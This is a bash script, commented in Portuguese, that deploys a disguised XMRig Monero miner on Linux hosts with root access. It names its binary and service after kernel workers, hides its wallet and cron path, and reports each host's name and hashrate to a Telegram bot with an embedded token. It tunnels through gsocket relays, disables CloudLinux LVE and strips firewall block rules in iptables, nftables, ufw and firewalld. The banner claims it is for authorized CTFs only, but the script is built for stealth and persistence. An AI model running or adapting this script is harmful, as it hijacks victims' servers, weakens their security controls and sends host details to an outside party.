#!/bin/bash
# ================================================================
# XMRig Auto-Reparável v6.7 – Modo Ultra-Adaptativo
# ================================================================
# - Compatível com systemd e SysV (chkconfig / update-rc.d)
# - Saída completa por padrão; use --silent para saída mínima
#   (apenas 2 mensagens: miner ativo + share aceito)
# ================================================================

set -o pipefail

# ---------- VERIFICAÇÃO DE ROOT ----------
if [ "$EUID" -ne 0 ]; then
    echo -e "\033[1;31m[!] Este script requer privilégios root (sudo).\033[0m"
    exit 1
fi

# ---------- CONFIGURAÇÕES GLOBAIS (EDITÁVEIS) ----------
WALLET="4AQHNHPGYLtRu4SsCbDfBVcX1K4JQfxVG44PRaVRiJ22iZpt7qnpficRvuFBAVdNAfZoWTWAjRRYJGrsHanByJh3DJhmfmB"

POOLS=(
    "141.94.96.71:443"
    "141.94.96.144:443"
    "pool.supportxmr.com:443"
    "pool.supportxmr.com:3333"
)

XMRIG_VERSION="6.22.2"
XMRIG_SHA256="e5f24a3c6b94d2a3380a52e3e2d3e23f0e5b6c7d8a9f0e1d2c3b4a5f6e7d8c9b"  # atualize com o hash oficial

BIN="/usr/local/bin/kworker-bin"
SERVICE_NAME="sys-update-kworker"
LOG_FILE="/var/log/kern-update.log"
STATE_FILE="/var/run/.mm_state"
CONFIG_FILE="/etc/kernel/params.json"                # xmrig config — mantém wallet/pool fora do ps
SWAPFILE="/var/.vmswap"
CRON_JOB_NAME="kmod-events"                          # nome do arquivo em /etc/cron.d/
CRON_HELPER="/usr/lib/systemd/system-update-check"   # wrapper: oculta o path de miner.sh no cron
MIN_FREE_MB=1200
MAX_TRIES=15
WAIT_TIMEOUT=300           # tempo máximo de espera pelo primeiro share (segundos)
CHECK_INTERVAL=2           # intervalo entre verificações do log
DONATE_LEVEL=0
SILENT=false               # ativado via --silent antes do subcomando

# GSOCKET — túnel para hosts com firewall restritivo que bloqueia saída para pools
# Deixe GSOCKET_SECRET vazio para desabilitar. Quando preenchido, é usado como
# último recurso após todas as conexões diretas falharem.
#
# Servidor relay (VPS com saída livre) — execute ANTES do deploy no alvo:
#   gs-netcat -l -s "$GSOCKET_SECRET" -d pool.supportxmr.com -p 443
#
# O script instala gsocket/socat automaticamente no alvo se necessário.
GSOCKET_SECRET=""         # segredo compartilhado com o servidor relay
GSOCKET_LOCAL_PORT=14433  # porta local do túnel no alvo

# TELEGRAM — notificações de deploy, status horário e alertas de parada
# Deixe TG_TOKEN vazio para desabilitar todas as notificações.
TG_TOKEN="8822601497:AAGlKda9XHo_AdHdGF3bsWzUysY4pxWcuX8"
TG_CHAT_ID="8306684358"
TG_LAST_FILE="/var/run/.miner_tg_last"
TG_REPORT_INTERVAL=3600   # intervalo mínimo entre relatórios de status (segundos)

# Cores
C_RED='\033[1;31m'; C_GREEN='\033[1;32m'; C_BLUE='\033[1;34m'
C_YELLOW='\033[1;33m'; C_CYAN='\033[1;36m'; C_NC='\033[0m'

log()  { [ "$SILENT" = "true" ] || echo -e "${C_BLUE}[*] $1${C_NC}"; }
ok()   { [ "$SILENT" = "true" ] || echo -e "${C_GREEN}[✓] $1${C_NC}"; }
err()  { [ "$SILENT" = "true" ] || echo -e "${C_RED}[!] $1${C_NC}"; }
warn() { [ "$SILENT" = "true" ] || echo -e "${C_YELLOW}[~] $1${C_NC}"; }
info() { [ "$SILENT" = "true" ] || echo -e "${C_CYAN}[i] $1${C_NC}"; }

banner() {
    [ "$SILENT" = "true" ] && return 0
    echo -e "${C_RED}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║   XMRig Auto-Reparável v6.7 - Modo Ultra-Adaptativo     ║"
    echo "║              Uso exclusivo em CTFs autorizados           ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "${C_NC}"
}

# ---------- NOTIFICAÇÕES TELEGRAM ----------
tg_send() {
    [ -z "$TG_TOKEN" ] && return 0
    curl -s -m 10 -X POST \
        "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
        --data-urlencode "text=$1" \
        -d "chat_id=${TG_CHAT_ID}" \
        -d "parse_mode=HTML" \
        -d "disable_web_page_preview=true" \
        >/dev/null 2>&1 || true
}

tg_get_hashrate() {
    grep -a "speed" "$LOG_FILE" 2>/dev/null \
        | tail -1 \
        | grep -oE '[0-9]+\.[0-9]+ H/s' \
        | head -1
}

tg_notify_deploy() {
    local hn hr ts
    hn=$(hostname 2>/dev/null || echo "desconhecido")
    hr=$(tg_get_hashrate)
    ts=$(date -u '+%Y-%m-%d %H:%M:%S UTC')
    tg_send "🟢 <b>Minerador Implantado</b>

🖥️ <b>Host:</b> ${hn}
👷 <b>Worker:</b> ${WORKER}
⛏️ <b>Threads:</b> ${THREADS} | <b>Light:</b> ${LIGHT}
🔗 <b>Pool:</b> ${POOLS[$POOL_INDEX]:-desconhecido}
⚡ <b>Hashrate:</b> ${hr:-inicializando...}
⏰ ${ts}"
    date +%s > "$TG_LAST_FILE" 2>/dev/null || true
}

tg_notify_status() {
    local hn hr ts proc_status
    hn=$(hostname 2>/dev/null || echo "desconhecido")
    hr=$(tg_get_hashrate)
    ts=$(date -u '+%Y-%m-%d %H:%M:%S UTC')
    pgrep -f kworker-bin >/dev/null 2>&1 && proc_status="✅ ATIVO" || proc_status="❌ INATIVO"
    tg_send "📊 <b>Status do Minerador</b>

🖥️ <b>Host:</b> ${hn}
👷 <b>Worker:</b> ${WORKER}
🔄 <b>Processo:</b> ${proc_status}
⚡ <b>Hashrate:</b> ${hr:-N/A}
⛏️ <b>Threads:</b> ${THREADS} | <b>Light:</b> ${LIGHT}
🔗 <b>Pool:</b> ${POOLS[$POOL_INDEX]:-desconhecido}
⏰ ${ts}"
    date +%s > "$TG_LAST_FILE" 2>/dev/null || true
}

tg_notify_stopped() {
    local reason="${1:-parado}"
    local hn ts
    hn=$(hostname 2>/dev/null || echo "desconhecido")
    ts=$(date -u '+%Y-%m-%d %H:%M:%S UTC')
    tg_send "🔴 <b>Minerador PARADO</b>

🖥️ <b>Host:</b> ${hn}
👷 <b>Worker:</b> ${WORKER}
⚠️ <b>Motivo:</b> ${reason}
⏰ ${ts}"
}

tg_notify_healing() {
    local hn ts
    hn=$(hostname 2>/dev/null || echo "desconhecido")
    ts=$(date -u '+%Y-%m-%d %H:%M:%S UTC')
    tg_send "⚠️ <b>Minerador Inativo — Recuperando</b>

🖥️ <b>Host:</b> ${hn}
👷 <b>Worker:</b> ${WORKER}
🔁 Iniciando recuperação automática...
⏰ ${ts}"
}

tg_maybe_send_status() {
    [ -z "$TG_TOKEN" ] && return 0
    local now last
    now=$(date +%s)
    last=$(cat "$TG_LAST_FILE" 2>/dev/null || echo 0)
    [ $(( now - last )) -ge "$TG_REPORT_INTERVAL" ] && tg_notify_status
}

# ---------- DETECÇÃO DO INIT SYSTEM ----------
detect_init() {
    if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
        INIT="systemd"
    else
        INIT="sysv"
    fi
    info "Init system detectado: $INIT"
}

# ---------- DETECÇÃO DO GERENCIADOR DE PACOTES ----------
detect_pkg_manager() {
    if   command -v pacman  >/dev/null 2>&1; then PKG_MANAGER="pacman"
    elif command -v apt-get >/dev/null 2>&1; then PKG_MANAGER="apt"
    elif command -v dnf     >/dev/null 2>&1; then PKG_MANAGER="dnf"
    elif command -v yum     >/dev/null 2>&1; then PKG_MANAGER="yum"
    elif command -v apk     >/dev/null 2>&1; then PKG_MANAGER="apk"
    elif command -v zypper  >/dev/null 2>&1; then PKG_MANAGER="zypper"
    else PKG_MANAGER=""
    fi
}

# Mapeia binário → nome do pacote conforme a distro
cmd_to_pkg() {
    local cmd=$1
    case "$PKG_MANAGER" in
        apt)
            case "$cmd" in
                ip)    echo "iproute2" ;;
                pkill) echo "procps"   ;;
                *)     echo "$cmd"     ;;
            esac ;;
        dnf|yum)
            case "$cmd" in
                ip)    echo "iproute"    ;;
                pkill) echo "procps-ng" ;;
                *)     echo "$cmd"      ;;
            esac ;;
        pacman)
            case "$cmd" in
                ip)    echo "iproute2"   ;;
                pkill) echo "procps-ng" ;;
                *)     echo "$cmd"      ;;
            esac ;;
        apk)
            case "$cmd" in
                ip)    echo "iproute2" ;;
                pkill) echo "procps"   ;;
                *)     echo "$cmd"     ;;
            esac ;;
        zypper)
            case "$cmd" in
                ip)    echo "iproute2" ;;
                pkill) echo "procps"   ;;
                *)     echo "$cmd"     ;;
            esac ;;
        *)   echo "$cmd" ;;
    esac
}

install_dep() {
    local pkg=$1
    log "Instalando dependência: $pkg..."
    case "$PKG_MANAGER" in
        pacman) pacman -S --noconfirm "$pkg" >/dev/null 2>&1 ;;
        apt)    apt-get install -y    "$pkg" >/dev/null 2>&1 ;;
        dnf)    dnf     install -y    "$pkg" >/dev/null 2>&1 ;;
        yum)    yum     install -y    "$pkg" >/dev/null 2>&1 ;;
        apk)    apk     add --no-cache "$pkg" >/dev/null 2>&1 ;;
        zypper) zypper  install -y    "$pkg" >/dev/null 2>&1 ;;
        *)      return 1 ;;
    esac
}

# ---------- DEPENDÊNCIAS ----------
check_deps() {
    detect_pkg_manager
    if [ -n "$PKG_MANAGER" ]; then
        info "Gerenciador de pacotes: $PKG_MANAGER"
    else
        warn "Gerenciador de pacotes não identificado — instalação automática desabilitada."
    fi

    local missing=0
    for cmd in wget tar pkill curl; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            warn "Dependência ausente: $cmd"
            if [ -n "$PKG_MANAGER" ]; then
                local pkg
                pkg=$(cmd_to_pkg "$cmd")
                if install_dep "$pkg" && command -v "$cmd" >/dev/null 2>&1; then
                    ok "$cmd instalado com sucesso."
                else
                    err "Falha ao instalar $cmd (pacote: $pkg). Instale manualmente."; missing=1
                fi
            else
                err "Instale manualmente: $cmd"; missing=1
            fi
        fi
    done

    if [ "$INIT" = "systemd" ]; then
        command -v systemctl >/dev/null 2>&1 || { err "systemctl não encontrado"; missing=1; }
    else
        command -v service >/dev/null 2>&1 \
            || warn "service não encontrado — gerenciamento SysV limitado (cron garante persistência)."
        if ! command -v chkconfig >/dev/null 2>&1 && ! command -v update-rc.d >/dev/null 2>&1; then
            warn "chkconfig e update-rc.d não encontrados — auto-start no boot indisponível."
        fi
    fi

    [ "$missing" -eq 1 ] && { err "Dependências em falta não puderam ser instaladas. Abortando."; exit 1; }
    ok "Dependências verificadas."
}

# Helper para habilitar/desabilitar serviço SysV (suporta chkconfig e update-rc.d)
sysv_enable()  {
    if command -v chkconfig >/dev/null 2>&1; then
        chkconfig --add "$1" 2>/dev/null
        chkconfig "$1" on 2>/dev/null
    else
        update-rc.d "$1" defaults 2>/dev/null
        update-rc.d "$1" enable   2>/dev/null
    fi
}
sysv_disable() {
    if command -v chkconfig >/dev/null 2>&1; then
        chkconfig "$1" off 2>/dev/null
    else
        update-rc.d "$1" disable 2>/dev/null
    fi
}

# ---------- WORKER ID (baseado no IP público) ----------
get_worker_id() {
    local ip
    ip=$(curl -4 -s --connect-timeout 5 ifconfig.me 2>/dev/null)
    [ -z "$ip" ] && ip=$(wget -4 -qO- --timeout=5 ifconfig.me 2>/dev/null)
    if [ -z "$ip" ] || [ "${#ip}" -gt 30 ]; then
        ip=$(hostname 2>/dev/null | tr -cd 'a-zA-Z0-9' | head -c 10)
        [ -z "$ip" ] && ip="worker$(date +%s | tail -c 5)"
    fi
    ip=$(echo "$ip" | tr '.' '-' | tr -cd 'a-zA-Z0-9-')
    echo "${ip:0:20}"
}
WORKER=$(get_worker_id)

# ---------- BYPASS DE /etc/hosts: resolve via DNS externo ----------
# Alguns provedores bloqueiam pools de mineração em /etc/hosts (→ 127.0.0.1).
# Esta função substitui hostnames pelos IPs reais resolvidos via 1.1.1.1,
# contornando o /etc/hosts sem precisar modificá-lo.
resolve_pools_bypass_hosts() {
    local -a resolved=()
    local host port ip
    for p in "${POOLS[@]}"; do
        host="${p%:*}"
        port="${p##*:}"
        # Verifica se já é um IP (não precisa resolver)
        if echo "$host" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$'; then
            resolved+=("$p")
            continue
        fi
        # Resolve via DNS externo (ignora /etc/hosts)
        ip=$(dig @1.1.1.1 +short +time=3 +tries=2 "$host" 2>/dev/null | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | head -1)
        if [ -n "$ip" ]; then
            info "Bypass /etc/hosts: $host → $ip"
            resolved+=("$ip:$port")
        else
            # Fallback: mantém hostname original
            resolved+=("$p")
        fi
    done
    POOLS=("${resolved[@]}")
}

# ---------- ORDENAÇÃO DOS POOLS POR LATÊNCIA TCP ----------
order_pools_by_latency() {
    log "Testando conectividade TCP aos pools..."
    local -a sorted_tmp=()
    local host port start end latency tcp_ok

    for p in "${POOLS[@]}"; do
        host="${p%:*}"
        port="${p##*:}"
        start=$(date +%s%N)
        if timeout 2 bash -c "exec 3<>/dev/tcp/$host/$port" 2>/dev/null; then
            tcp_ok=1
        else
            tcp_ok=0
        fi
        end=$(date +%s%N)

        if [ "$tcp_ok" = "1" ]; then
            latency=$(( (end - start) / 1000000 ))
            [ "$latency" -lt 1 ] && latency=1
        else
            latency=9999
        fi
        sorted_tmp+=("$(printf '%05d' "$latency"):$p")
        info "$host:$port → ${latency}ms"
    done

    # Ordena numericamente pela latência (prefixo de 5 dígitos)
    mapfile -t sorted_tmp < <(printf '%s\n' "${sorted_tmp[@]}" | sort -n)

    POOLS=()
    for entry in "${sorted_tmp[@]}"; do
        POOLS+=("${entry#*:}")
    done
    ok "Pools reordenados por menor latência TCP."
}

# ---------- CLOUDLINUX / LVE ----------
detect_cloudlinux() {
    [ -f /etc/cloudlinux-release ] && return 0
    lsmod 2>/dev/null | grep -q kmodlve && return 0
    return 1
}

# ---------- SWAP (necessário quando RAM < 512MB para RandomX light) ----------
setup_swap() {
    local total_ram_mb swap_total_mb needed_mb=512
    total_ram_mb=$(free -m | awk '/Mem:/{print $2}')
    swap_total_mb=$(free -m | awk '/Swap:/{print $2}')

    if [ "$total_ram_mb" -ge "$needed_mb" ] && [ "$swap_total_mb" -gt 0 ]; then
        info "RAM/swap suficiente para RandomX. Nenhum swap adicional necessário."
        return 0
    fi

    local swapfile="$SWAPFILE"
    if [ -f "$swapfile" ] && swapon --show | grep -q "$swapfile"; then
        info "Swap já ativo em $swapfile."
        return 0
    fi

    warn "RAM total: ${total_ram_mb}MB | Swap: ${swap_total_mb}MB — insuficiente para RandomX (mín. ${needed_mb}MB)."
    log "Criando swapfile de 512MB em $swapfile..."

    # Verifica espaço em disco
    local free_disk_mb
    free_disk_mb=$(df -m / | awk 'NR==2{print $4}')
    if [ "$free_disk_mb" -lt 600 ]; then
        err "Espaço em disco insuficiente para criar swap (${free_disk_mb}MB livre). XMRig irá falhar por falta de memória."
        return 1
    fi

    dd if=/dev/zero of="$swapfile" bs=1M count=512 2>/dev/null || { err "Falha ao criar swapfile."; return 1; }
    chmod 600 "$swapfile"
    mkswap "$swapfile" >/dev/null 2>&1 || { err "Falha no mkswap."; rm -f "$swapfile"; return 1; }
    swapon "$swapfile" || { err "Falha ao ativar swap."; rm -f "$swapfile"; return 1; }

    # Persiste no fstab se ainda não estiver
    grep -q "$swapfile" /etc/fstab 2>/dev/null || echo "$swapfile none swap sw 0 0" >> /etc/fstab

    ok "Swap de 512MB criado e ativo. RandomX poderá inicializar."
}

disable_lve() {
    if detect_cloudlinux; then
        warn "CloudLinux LVE detectado. Tentando desabilitar..."
        service lve stop 2>/dev/null
        sysv_disable lve
        if ! grep -q "blacklist kmodlve" /etc/modprobe.d/blacklist-lve.conf 2>/dev/null; then
            echo "blacklist kmodlve" >> /etc/modprobe.d/blacklist-lve.conf
        fi
        if lsmod 2>/dev/null | grep -q kmodlve; then
            warn "Módulo LVE em uso. Reinicie o sistema para completar a desativação."
            touch /var/run/.lve_reboot_needed
        else
            ok "LVE desabilitado com sucesso."
        fi
    else
        info "CloudLinux LVE não detectado."
    fi
}

# ---------- WHITELIST NO CSF ----------
whitelist_csf() {
    if command -v csf >/dev/null 2>&1; then
        log "CSF detectado. Adicionando regras de whitelist..."
        for item in "exe:$BIN" "cmd:/etc/init.d/$SERVICE_NAME" "file:/etc/init.d/$SERVICE_NAME"; do
            grep -q "$item" /etc/csf/csf.pignore 2>/dev/null || echo "$item" >> /etc/csf/csf.pignore
        done
        csf -r >/dev/null 2>&1
    else
        info "CSF não detectado – pulando whitelist."
    fi
}

# ---------- CONFIGURAÇÃO DINÂMICA DE THREADS ----------
tune_miner() {
    local total_ram_mb free_ram_mb cores phys_cores max_by_ram max_by_cpu max_threads max_usage
    total_ram_mb=$(free -m | awk '/Mem:/{print $2}')
    free_ram_mb=$(free -m  | awk '/Mem:/{print $4}')
    cores=$(nproc)

    # RandomX é memory-bound: HT não ajuda e scratchpads extras (2MB cada) podem
    # exceder o L3, causando cache spill. Usa physical cores como teto natural.
    phys_cores=$(grep "cpu cores" /proc/cpuinfo 2>/dev/null | head -1 | awk '{print $NF}')
    { [ -z "$phys_cores" ] || [ "$phys_cores" -lt 1 ]; } && phys_cores=$cores

    # ~2 GB de RAM por thread (requisito do RandomX)
    max_by_ram=$(( total_ram_mb / 2048 ))
    [ "$max_by_ram" -lt 1 ] && max_by_ram=1
    max_by_cpu=$phys_cores

    max_threads=$(( max_by_ram < max_by_cpu ? max_by_ram : max_by_cpu ))
    # sem hard cap: a regra de 75% abaixo já protege o sistema

    if [ "$free_ram_mb" -lt 2048 ]; then
        THREADS=1
        LIGHT="true"
    elif [ "$free_ram_mb" -lt 4096 ]; then
        THREADS=$(( max_threads / 2 ))
        [ "$THREADS" -lt 1 ] && THREADS=1
        LIGHT="false"
    else
        THREADS=$max_threads
        LIGHT="false"
    fi

    # CloudLinux: força 2 threads e modo light
    if detect_cloudlinux; then
        [ "$THREADS" -gt 2 ] && THREADS=2
        LIGHT="true"
        info "CloudLinux detectado: limitado a 2 threads + modo light"
    fi

    # Limite de 75% dos cores (mínimo 1) para não comprometer o sistema
    max_usage=$(( cores * 75 / 100 ))
    [ "$max_usage" -lt 1 ] && max_usage=1
    [ "$THREADS" -gt "$max_usage" ] && THREADS=$max_usage
    [ "$THREADS" -lt 1 ] && THREADS=1

    # Sem AES-NI: modo light e reduz threads
    if ! grep -q aes /proc/cpuinfo; then
        LIGHT="true"
        [ "$THREADS" -gt 2 ] && THREADS=2
        info "Sem AES-NI: modo light ativado."
    fi

    # Ajusta timeout de espera pelo primeiro share conforme recursos disponíveis.
    # RAM crítica (<1GB livre) → 15 min; modo light (RAM baixa / sem AES-NI / CloudLinux) → 10 min; normal → 5 min.
    if [ "$free_ram_mb" -lt 1024 ]; then
        WAIT_TIMEOUT=2400
        info "RAM crítica (<1GB livre): timeout de share ajustado para ${WAIT_TIMEOUT}s."
    elif [ "$LIGHT" = "true" ]; then
        WAIT_TIMEOUT=3600
        info "Modo light ativo: timeout de share ajustado para ${WAIT_TIMEOUT}s."
    else
        WAIT_TIMEOUT=900
    fi

    save_state
}

# ---------- VERIFICAÇÃO DE MEMÓRIA MÍNIMA PARA RANDOMX ----------
# RandomX light mode cache = 256MB. Com overhead do OS (~50MB), mínimo ~280MB de VM total.
check_min_memory() {
    local total_ram_mb total_swap_mb total_vm_mb
    total_ram_mb=$(free -m | awk '/Mem:/{print $2}')
    total_swap_mb=$(free -m | awk '/Swap:/{print $2}')
    total_vm_mb=$(( total_ram_mb + total_swap_mb ))
    if [ "$total_vm_mb" -lt 280 ]; then
        err "Memória insuficiente para RandomX light mode."
        err "  RAM: ${total_ram_mb}MB | Swap: ${total_swap_mb}MB | Total VM: ${total_vm_mb}MB"
        err "  Mínimo necessário: 280MB de memória virtual total."
        err "  Este host não pode executar RandomX. Atualize para ≥512MB RAM."
        return 1
    fi
    info "Memória virtual total: ${total_vm_mb}MB (RAM ${total_ram_mb}MB + Swap ${total_swap_mb}MB) — OK."
    return 0
}

# ---------- HUGE PAGES ----------
setup_huge_pages() {
    local total_ram_mb
    total_ram_mb=$(free -m | awk '/Mem:/{print $2}')
    if [ "$total_ram_mb" -lt 512 ]; then
        info "RAM < 512MB: huge pages ignoradas (sem benefício com RandomX light mode)."
        return 0
    fi
    # Dataset rx/0 = 2336 MB = 1168 × 2MB huge pages.
    # Adiciona 1 página por thread (scratchpad) + 32 de buffer para o JIT.
    local needed=$(( 1168 + ${THREADS:-8} + 32 ))
    local current
    current=$(awk '/HugePages_Total/{print $2}' /proc/meminfo 2>/dev/null)
    current=${current:-0}

    if [ "$current" -lt "$needed" ]; then
        log "Configurando Huge Pages: ${needed} páginas de 2MB (atuais: ${current})..."
        sysctl -w vm.nr_hugepages="$needed" >/dev/null 2>&1
        sed -i '/vm.nr_hugepages/d' /etc/sysctl.conf 2>/dev/null
        echo "vm.nr_hugepages=$needed" >> /etc/sysctl.conf 2>/dev/null
        echo "vm.nr_hugepages=$needed" > /etc/sysctl.d/99-mm-tune.conf 2>/dev/null
        ok "Huge Pages configuradas: ${needed} páginas de 2MB."
    else
        info "Huge Pages suficientes já ativas (${current} ≥ ${needed})."
    fi
}

# ---------- TMPFS PARA CACHE RANDOMX ----------
setup_tmpfs_cache() {
    local free_ram_mb
    free_ram_mb=$(free -m | awk '/Mem:/{print $4}')
    if [ "$free_ram_mb" -gt 4096 ]; then
        log "Criando tmpfs de 2GB para cache RandomX..."
        mkdir -p /dev/shm/.cache
        mountpoint -q /dev/shm/.cache || mount -t tmpfs -o size=2G tmpfs /dev/shm/.cache
        ok "Cache em tmpfs ativo."
    else
        info "RAM insuficiente para tmpfs (necessário >4GB livre)."
    fi
}

# ---------- MSR (Model Specific Registers) ----------
# Sem o módulo msr, XMRig não consegue aplicar presets de RandomX e avisa
# "FAILED TO APPLY MSR MOD, HASHRATE WILL BE LOW". Ganho típico: 10-15%.
setup_msr() {
    if lsmod 2>/dev/null | grep -q "^msr "; then
        info "Módulo MSR já carregado."
        return 0
    fi
    if modprobe msr 2>/dev/null; then
        ok "Módulo MSR carregado — presets RandomX habilitados (+10-15% hashrate)."
        # Persiste entre reboots
        grep -q "^msr$" /etc/modules 2>/dev/null || echo "msr" >> /etc/modules 2>/dev/null
        echo "msr" > /etc/modules-load.d/msr.conf 2>/dev/null || true
    else
        warn "Módulo MSR indisponível (kernel sem suporte ou hypervisor bloqueando)."
    fi
}

# ---------- CPU GOVERNOR ----------
# Garante frequência máxima sustentada; servidores podem estar em powersave.
setup_cpu_governor() {
    local gov_path="/sys/devices/system/cpu/cpu0/cpufreq/scaling_governor"
    [ ! -f "$gov_path" ] && { info "CPU governor não disponível neste ambiente."; return 0; }
    local current
    current=$(cat "$gov_path" 2>/dev/null)
    if [ "$current" != "performance" ]; then
        for g in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
            echo performance > "$g" 2>/dev/null || true
        done
        ok "CPU governor → performance (era: ${current:-desconhecido})."
    else
        info "CPU governor já em modo performance."
    fi
}

# ---------- 1GB HUGE PAGES ----------
# Reduz TLB misses no dataset RandomX (2GB); requer suporte do kernel.
# Só aloca se houver RAM livre suficiente.
setup_1gb_hugepages() {
    local hp1g_path="/sys/kernel/mm/hugepages/hugepages-1048576kB/nr_hugepages"
    if [ ! -f "$hp1g_path" ]; then
        info "1GB huge pages não suportadas pelo kernel."
        return 0
    fi
    # Dataset rx/0 = ~2GB → 3 páginas; +1 por thread de scratchpad; buffer de 1
    local needed=$(( 3 + ${THREADS:-4} + 1 ))
    local free_ram_gb
    free_ram_gb=$(free -g | awk '/Mem:/{print $4}')
    if [ "${free_ram_gb:-0}" -lt "$needed" ]; then
        info "RAM livre insuficiente para 1GB huge pages (${free_ram_gb}GB livre, ${needed}GB necessário)."
        return 0
    fi
    local current
    current=$(cat "$hp1g_path" 2>/dev/null)
    current=${current:-0}
    if [ "$current" -lt "$needed" ]; then
        echo "$needed" > "$hp1g_path" 2>/dev/null && \
            ok "1GB huge pages configuradas: ${needed} páginas." || \
            warn "Falha ao configurar 1GB huge pages (normal em VMs sem suporte no kernel)."
    else
        info "1GB huge pages já suficientes (${current} ≥ ${needed})."
    fi
}

# ---------- TESTE DE CONEXÃO COM O POOL ----------
test_pool_connection() {
    local host=$1 port=$2
    if command -v nc >/dev/null 2>&1; then
        timeout 3 nc -z -w 2 "$host" "$port" 2>/dev/null && return 0
    fi
    if timeout 3 bash -c "exec 3<>/dev/tcp/$host/$port && exec 3>&-" 2>/dev/null; then
        return 0
    fi
    if [ "$port" = "443" ] || [ "$port" = "80" ]; then
        local proto="http"
        [ "$port" = "443" ] && proto="https"
        timeout 3 curl -sk --connect-timeout 2 "${proto}://${host}:${port}" >/dev/null 2>&1 && return 0
    fi
    return 1
}

# ---------- ABRIR PORTA NO FIREWALL ----------
open_port() {
    local port=$1
    iptables -C OUTPUT -p tcp --dport "$port" -j ACCEPT 2>/dev/null && return 0
    log "Abrindo porta $port no firewall..."
    iptables -I OUTPUT -p tcp --dport "$port" -j ACCEPT
    service iptables save &>/dev/null || true
}

# ---------- VERIFICAÇÃO E REMOÇÃO DE BLOQUEIOS DE FIREWALL ----------
check_and_fix_firewall() {
    log "Verificando bloqueios de firewall para os pools..."
    local fixed=0

    # Coleta portas e IPs únicos dos pools
    local -a pool_ports=() pool_hosts=()
    for p in "${POOLS[@]}"; do
        pool_ports+=("${p##*:}")
        pool_hosts+=("${p%:*}")
    done
    mapfile -t pool_ports < <(printf '%s\n' "${pool_ports[@]}" | sort -u)
    mapfile -t pool_hosts < <(printf '%s\n' "${pool_hosts[@]}" | sort -u)

    # ---- iptables ----
    if command -v iptables >/dev/null 2>&1; then
        # Corrige política DROP/REJECT na chain OUTPUT
        local out_policy
        out_policy=$(iptables -L OUTPUT -n 2>/dev/null | head -1 | grep -oP 'policy \K\w+')
        if [ "$out_policy" = "DROP" ] || [ "$out_policy" = "REJECT" ]; then
            warn "Política padrão OUTPUT=$out_policy. Alterando para ACCEPT..."
            iptables -P OUTPUT ACCEPT && ok "Política OUTPUT → ACCEPT." && fixed=1
        fi

        # Remove regras DROP/REJECT por porta nas chains OUTPUT e FORWARD
        for chain in OUTPUT FORWARD; do
            for port in "${pool_ports[@]}"; do
                local rule_num
                while true; do
                    rule_num=$(iptables -L "$chain" --line-numbers -n 2>/dev/null \
                        | grep -E "^[0-9]+" | grep -E "(DROP|REJECT)" | grep "dpt:$port" \
                        | head -1 | awk '{print $1}')
                    [ -n "$rule_num" ] || break
                    warn "Removendo regra iptables $chain #$rule_num (bloqueio porta $port)..."
                    iptables -D "$chain" "$rule_num" && fixed=1 || break
                done
            done
        done

        # Remove regras DROP/REJECT por IP de pool
        for host in "${pool_hosts[@]}"; do
            echo "$host" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' || continue
            local rule_num
            while true; do
                rule_num=$(iptables -L OUTPUT --line-numbers -n 2>/dev/null \
                    | grep -E "^[0-9]+" | grep -E "(DROP|REJECT)" | grep "$host" \
                    | head -1 | awk '{print $1}')
                [ -n "$rule_num" ] || break
                warn "Removendo regra iptables OUTPUT #$rule_num (bloqueio IP $host)..."
                iptables -D OUTPUT "$rule_num" && fixed=1 || break
            done
        done

        # Garante regras ACCEPT no topo para todas as portas dos pools
        for port in "${pool_ports[@]}"; do
            open_port "$port"
        done

        # Persiste as regras (Debian/Ubuntu: /etc/iptables/rules.v4; RHEL/CentOS: service iptables save)
        { mkdir -p /etc/iptables && iptables-save > /etc/iptables/rules.v4; } 2>/dev/null || \
            service iptables save 2>/dev/null || true
    fi

    # ---- nftables ----
    if command -v nft >/dev/null 2>&1; then
        local nft_ruleset
        nft_ruleset=$(nft list ruleset 2>/dev/null)
        if echo "$nft_ruleset" | grep -qiE "\bdrop\b|\breject\b"; then
            for port in "${pool_ports[@]}"; do
                if echo "$nft_ruleset" | grep -qiE "dport $port.*(drop|reject)|(drop|reject).*dport $port"; then
                    warn "nftables pode estar bloqueando porta $port. Inserindo accept..."
                    nft insert rule inet filter output tcp dport "$port" accept 2>/dev/null || \
                    nft insert rule ip filter output tcp dport "$port" accept 2>/dev/null || true
                    fixed=1
                fi
            done
        fi
    fi

    # ---- ufw ----
    if command -v ufw >/dev/null 2>&1 && ufw status 2>/dev/null | grep -q "Status: active"; then
        local ufw_out_policy
        ufw_out_policy=$(ufw status verbose 2>/dev/null \
            | awk '/^Default:/{for(i=1;i<=NF;i++) if($(i)=="(outgoing)") print $(i-1)}')
        for port in "${pool_ports[@]}"; do
            local blocked=0
            ufw status 2>/dev/null | grep -qiE "(DENY|REJECT) OUT.*$port|$port.*(DENY|REJECT) OUT" \
                && blocked=1
            { [ "$ufw_out_policy" = "deny" ] || [ "$ufw_out_policy" = "reject" ]; } \
                && blocked=1
            if [ "$blocked" -eq 1 ]; then
                warn "UFW bloqueando saída na porta $port. Adicionando regra de allow..."
                ufw allow out to any port "$port" proto tcp >/dev/null 2>&1 && fixed=1
            fi
        done
    fi

    # ---- firewalld ----
    if command -v firewall-cmd >/dev/null 2>&1 && firewall-cmd --state 2>/dev/null | grep -q "running"; then
        for port in "${pool_ports[@]}"; do
            local rich_rule
            rich_rule=$(firewall-cmd --list-rich-rules 2>/dev/null \
                | grep "port=\"$port\"" | grep -iE "drop|reject" | head -1)
            if [ -n "$rich_rule" ]; then
                warn "firewalld bloqueando porta $port via rich rule. Removendo..."
                firewall-cmd --remove-rich-rule="$rich_rule" 2>/dev/null && fixed=1
            fi
            firewall-cmd --direct --add-rule ipv4 filter OUTPUT 0 \
                -p tcp --dport "$port" -j ACCEPT 2>/dev/null || true
        done
        [ "$fixed" -eq 1 ] && firewall-cmd --runtime-to-permanent 2>/dev/null || true
    fi

    if [ "$fixed" -eq 1 ]; then
        ok "Bloqueios removidos. Conectividade com os pools desbloqueada."
    else
        ok "Nenhum bloqueio de firewall detectado para os pools."
    fi
}

